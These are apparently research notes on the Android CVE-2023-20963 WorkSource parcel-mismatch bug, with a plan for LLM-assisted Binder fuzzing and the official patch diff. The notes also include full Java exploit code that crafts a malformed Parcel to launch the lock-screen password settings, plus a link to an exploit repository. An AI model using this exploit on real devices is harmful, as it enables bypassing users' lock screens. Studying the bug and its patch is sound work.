### **CVE-2023-20963**

**Attack Flow Overview:**

The attacker begins by manually crafting a Parcel subclass called WorkSource, creating an empty data payload (but actually putting some important data after the empty payload) to bypass standard validation and security checks during the unparcel (unserialize) process. The system thinks it is empty, so it skips the security checks. They then escalate privileges to root by manually setting the user and group to system, effectively granting the Parcel root-level access.

Next, the attacker writes a system Intent into the crafted parcel to trigger the launch of any high-priority system component. In the demo scenario, this was used to launch the system’s lock screen password activity—allowing the attacker to override the lock screen password directly.

# What's next

I have already compiled the system image. I can continue to debug the Android framework layer and check the details in the unserialize process and how the security checks work.

Larkhan can continue to try different exploits on the user space.

# Maybe a paper

My idea is to integrate LLMs with BinderCracker to automatically discover logic bugs similar to CVE-2023-20963.
### **Current Limitations of Fuzzing (and Why a Paper Makes Sense)**

Despite the success of fuzzing in discovering memory corruption bugs, **traditional fuzzers still struggle with logic bugs, permission issues, and context-sensitive vulnerabilities**—especially in complex systems like Android.

#### Key Limitations:
1. **Lack of Semantic Awareness**  
   Most fuzzers operate at the byte or field level, without understanding the *meaning* of the data being sent. This is particularly problematic for systems like Android Binder, where IPC payloads must follow strict structures defined by AIDL interfaces.

2. **Poor Context Modeling**  
   Fuzzers typically generate inputs without considering the caller's identity, permission state, or system context. Many real-world vulnerabilities—like **CVE-2023-20963**—are **logic bugs** triggered only under specific privilege assumptions or system states. Current fuzzers miss these.

3. **Static Templates & Manual Setup**  
   Even structure-aware fuzzers (e.g., BinderCracker) require manual definition of input templates or rely on static interface analysis. This limits scalability and adaptability when interfaces evolve or are vendor-specific.

4. **No Reasoning for Exploit Chains**  
   Existing tools cannot chain operations or reason about multi-step interactions that may lead to privilege escalation or data leaks. They are blind to *semantic flows* and *intentional misuse* of APIs.

---

### Why This Warrants a New Paper:

By integrating **Large Language Models (LLMs)** into the fuzzing loop, we can:

- Automatically infer interface semantics from AIDL and documentation;
- Generate intelligent, context-aware test inputs;
- Explore *logical abuse* paths (e.g., privilege escalation, intent misuse);
- Reduce manual effort in defining and maintaining fuzzing harnesses.

This represents a **novel, impactful direction**—combining LLMs' reasoning ability with fuzzing's execution-driven discovery—to uncover bugs that were previously unreachable using traditional methods.


---
**Full Exploit Chain (Simplified):**

```
[App constructs a Bundle]

    ↓

[Sends it to the system via Intent or IPC]

    ↓

[System service (e.g., ActivityManagerService) receives it]

    ↓

[System deserializes the Bundle] 

    ↓

[Target component executes logic using the Bundle content]
```
---
**Detailed Bundle Deserialization Flow:**

```
Parcel memory data (binary blob)

    ↓

Bundle.readFromParcel()

    ↓

BaseBundle.unparcel()

    ↓

Parses internal Map<String, Object>

    ↓

Returns a fully reconstructed Bundle object
```


---

The following program is originally intended by the Android system to allow apps to add their own account types in the system settings, such as adding a Google account:
```java
public class MyAuthenticator extends AbstractAccountAuthenticator {
    @Override
    public Bundle addAccount(...) {
        // This is originally meant to start the app’s own activity to handle user login or registration,
        // but here we construct a malicious system intent to launch a high-privilege application instead.
    }
}

```

## the exploit

the full exploit code check here:
[https://github.com/pwnipc/BadParcel/blob/main/app/src/main/java/com/example/badparcel/MyAuthenticator.java](https://github.com/pwnipc/BadParcel/blob/main/app/src/main/java/com/example/badparcel/MyAuthenticator.java)

```java
public class MyAuthenticator extends AbstractAccountAuthenticator {
	@Override
    public Bundle addAccount(AccountAuthenticatorResponse accountAuthenticatorResponse, String s, String s1, String[] strings, Bundle options) throws NetworkErrorException {
        final String TAG = "FadeMode";
Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.password.ChooseLockPassword"));
        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        obtain2.writeInt(3);
        obtain2.writeInt(13);
        obtain2.writeInt(2);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(6);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("android.os.WorkSource");
        obtain2.writeInt(-1);
        obtain2.writeInt(-1);
        obtain2.writeInt(-1);
        obtain2.writeInt(1);
        obtain2.writeInt(-1);
        obtain2.writeInt(13);
        obtain2.writeInt(13);
        obtain2.writeInt(68);
        obtain2.writeInt(11);
        obtain2.writeInt(0);
        obtain2.writeInt(7);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(13);
        obtain2.writeInt(22);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);
        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());
        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);
        int dataSize = obtain2.dataSize();
        Log.d(TAG, "length is " + Integer.toHexString(dataSize));
        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444E42);
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);
        bundle.readFromParcel(obtain);
        Log.d(TAG, bundle.toString());
        return bundle;
    }
```
## the official patch comment

Reconcile WorkSource parcel and unparcel code.

Prior to this CL, WorkSources would Parcel their list of WorkChains as
-1 if null, or the size of the list followed by the list itself if
non-null. When reading it back in, on the other hand, they would check
if the size was positive, and only then read the list from the Parcel.
This works for all cases except when the WorkSource has an empty but
non-null list of WorkChains as the list would get written to the parcel,
but then never read on the other side.

If parceling a list was a no-op when empty this wouldn't be an issue,
but it must write at least its size into the parcel to know how many
elements to extract. In the empty list case, this single element is left
unread as the size is not positive which essentially corrupts any future
items read from that same parcelable.

# the patch
https://android.googlesource.com/platform/frameworks/base/+/266b3bddcf14d448c0972db64b42950f76c759e3
Bug: 220302519
Test: atest android.security.cts.WorkSourceTest#testWorkChainParceling
Change-Id: [I2fec40dfced420ca38e717059b0e95ee8ef9946a](https://android-review.googlesource.com/#/q/I2fec40dfced420ca38e717059b0e95ee8ef9946a)
```
iff --git [a/core/java/android/os/WorkSource.java](https://android.googlesource.com/platform/frameworks/base/+/2663e8aa43c64368420cc04b03f813b7f0cfb7d2/core/java/android/os/WorkSource.java) [b/core/java/android/os/WorkSource.java](https://android.googlesource.com/platform/frameworks/base/+/266b3bddcf14d448c0972db64b42950f76c759e3/core/java/android/os/WorkSource.java)
index 0b4a561..4e7a280 100644
--- a/core/java/android/os/WorkSource.java
+++ b/core/java/android/os/WorkSource.java

@@ -114,7 +114,7 @@
         mNames = in.createStringArray();
 
         int numChains = in.readInt();
-        if (numChains > 0) {
+        if (numChains >= 0) {
             mChains = new ArrayList<>(numChains);
             in.readParcelableList(mChains, WorkChain.class.getClassLoader());
         } else {
```

## the whole picture
![[Pasted image 20250417121306.png]]
